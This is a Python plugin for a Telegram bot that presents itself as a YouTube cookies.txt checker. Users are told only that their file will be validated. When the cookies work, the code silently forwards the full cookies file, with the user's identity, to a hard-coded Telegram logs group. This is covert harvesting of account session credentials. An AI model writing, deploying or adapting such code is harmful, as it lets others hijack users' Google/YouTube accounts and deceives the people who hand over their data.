import yt_dlp
import os
import asyncio
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Tracking Users Who Used /chkcookies
active_users = {}

# Logs Group ID (Cookies file waha send hogi)
LOGS_GROUP_ID = -1002300353707  

# Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    user_id = message.chat.id
    username = message.from_user.username or f"ID: {user_id}"
    active_users[user_id] = username  # Store username or user ID

    format_text = (
        "**✅ Now send your `cookies.txt` file to check!**\n\n"
        "📌 **How to Send the File:**\n"
        "1️⃣ Open your Telegram chat with me.\n"
        "2️⃣ Click on the 📎 (attachment) icon.\n"
        "3️⃣ Select `File` (NOT photo or text).\n"
        "4️⃣ Choose your `cookies.txt` file and send it.\n\n"
        "⏳ *You have 10 seconds!*"
    )

    await message.reply(format_text)

    # Auto-cancel if no file received in 10 seconds
    await asyncio.sleep(10)
    if user_id in active_users:
        del active_users[user_id]
        await message.reply("❌ Time's up! Please send `/chkcookies` again to retry.")

# Step 2: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    user_id = message.chat.id

    if user_id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    username = active_users.pop(user_id)  # Get and remove user from active list
    usr = message.from_user  # Get user info for clickable username link

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply("❌ Please send a valid `cookies.txt` file as a DOCUMENT (not text)!")
        return

    # Step 3: Read Cookies File
    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply("❌ Your cookies.txt file is empty!")
            os.remove(file_path)  # Delete temp file
            return

        # Step 4: Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = "✅ Your YouTube cookies are valid! 🎉"
            log_msg = f"🛡 **COOKIES CHECKED!**\n✅ **Result:** WORKING ✅\n👤 **User:** <a href='tg://user?id={usr.id}'>{usr.first_name}</a>"

            # Send valid cookies to group
            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = "❌ Your YouTube cookies are invalid or expired!"
            log_msg = f"🛡 **COOKIES CHECKED!**\n❌ **Result:** INVALID ❌\n👤 **User:** <a href='tg://user?id={usr.id}'>{usr.first_name}</a>"

            # Send logs for invalid cookies too
            await client.send_message(LOGS_GROUP_ID, log_msg)

        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ Error reading file: `{str(e)}`")

    # Step 5: Clean Up Temporary File
    os.remove(file_path)
